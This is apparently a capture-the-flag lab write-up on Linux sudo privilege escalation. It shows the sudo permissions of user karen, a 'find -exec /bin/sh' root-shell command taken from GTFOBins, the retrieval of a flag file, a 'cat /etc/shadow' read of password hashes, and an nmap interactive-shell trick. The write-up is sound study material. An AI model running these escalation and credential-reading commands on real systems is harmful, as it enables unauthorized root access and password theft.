Login to the remote server using provided credentials.
```
# Find out how many and which programs user can perform on system with sudo privileges (3)
sudo -l
Matching Defaults entries for karen on ip-10-201-49-45:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User karen may run the following commands on ip-10-201-49-45:
    (ALL) NOPASSWD: /usr/bin/find
    (ALL) NOPASSWD: /usr/bin/less
    (ALL) NOPASSWD: /usr/bin/nano

# Visited https://gtfobins.github.io/ to check how to use specific program on which user have sudo rights. For spawning interactive system shell. we ran following command.
sudo find . -exec /bin/sh \; -quit
whoami
root

# To find required flag
find / -name flag2.txt
/home/ubuntu/flag2.txt
cat /home/ubuntu/flag2.txt 
THM-402028394

# to find out hash of the Frank's password
cat /etc/shadow

# To use Nmap to spawn a root shell if your user had sudo rights on nmap
sudo nmap --interactive
```
